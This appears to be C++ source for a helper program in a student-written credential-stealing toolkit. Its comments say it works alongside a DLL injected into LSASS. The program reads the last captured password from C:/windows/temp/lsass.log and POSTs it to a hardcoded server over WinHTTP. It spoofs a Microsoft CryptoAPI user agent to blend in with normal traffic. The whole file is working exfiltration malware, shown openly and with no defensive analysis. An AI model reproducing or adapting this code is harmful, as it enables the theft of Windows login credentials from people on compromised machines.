//
// Asa Horn
// aoh9470@rit.edu
//

// This file contains a helper executable which performs extra functions for the malicious tool
// These functions are contained in a standalone app because LSASS is blocked from doing some things,
// for example some networking. It also lets me change the server IP after deployment (can't overwrite a
// dll which is injected into LSASS)

#include <windows.h>
#include <iostream>
#include <string>
#include <ntsecapi.h>
#include <winhttp.h>
#include <vector>
#include <fstream>

#pragma comment(lib, "winhttp.lib")

BOOL sendToServer(PUNICODE_STRING text) {
    //std::cout << text->Buffer;

    // Initialize WinHTTP
    HINTERNET hSession = WinHttpOpen(L"Microsoft-CryptoAPI/10.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        // std::cerr << "winhttp failed";
        return FALSE;
    }

    // Connect to the remote
    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.109.131", 80, 0);
    if (!hConnect) {
        //std::cerr << "connect failed";
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Create an HTTP POST
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/post",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            0);
    if (!hRequest) {
        // std::cerr << "POST failed";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Send the request
    LPCWSTR headers = L"Content-Type: text/plain; charset=UTF-16LE";
    BOOL bResults = WinHttpSendRequest(hRequest,
                                       headers, -1L,
                                       (LPVOID)text->Buffer,
                                       text->Length,
                                       text->Length, 0);

    // std::cout << "Sent!";

    // Clean up
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}

void GetLastLineFromFile(const std::wstring& filename, std::wstring& lastLine) {
    std::wifstream passwordFile(filename.c_str(), std::ios::binary);
    if (!passwordFile.is_open()) {
        std::wcerr << L"Error opening file: " << filename << std::endl;
        return;
    }

    passwordFile.seekg(0, std::ios::end); // Move to the end of the file
    std::streampos fileSize = passwordFile.tellg();
    std::vector<wchar_t> buffer(fileSize / sizeof(wchar_t));

    passwordFile.seekg(0, std::ios::beg); // Move back to the beginning
    passwordFile.read(buffer.data(), fileSize / sizeof(wchar_t));

    // Close the file
    passwordFile.close();

    // Reverse iterate through the buffer to find the last line
    for (auto it = buffer.rbegin(); it != buffer.rend(); ++it) {
        if (*it == L'\n') {
            lastLine.assign(it.base(), buffer.end()); // Extract last line
            break;
        }
    }

    if (lastLine.empty()) {
        // If no newline was found, the entire file is one line
        lastLine.assign(buffer.begin(), buffer.end());
    }
}

int main() {
    std::wstring filename = L"C:/windows/temp/lsass.log";
    std::wstring lastLine;

    GetLastLineFromFile(filename, lastLine);

    // Prepare a UNICODE_STRING
    UNICODE_STRING unicodeString;
    unicodeString.Length = static_cast<USHORT>(lastLine.length() * sizeof(wchar_t));
    unicodeString.MaximumLength = unicodeString.Length + sizeof(wchar_t);
    unicodeString.Buffer = const_cast<PWCH>(lastLine.c_str());

    sendToServer(&unicodeString);

    return 0;
}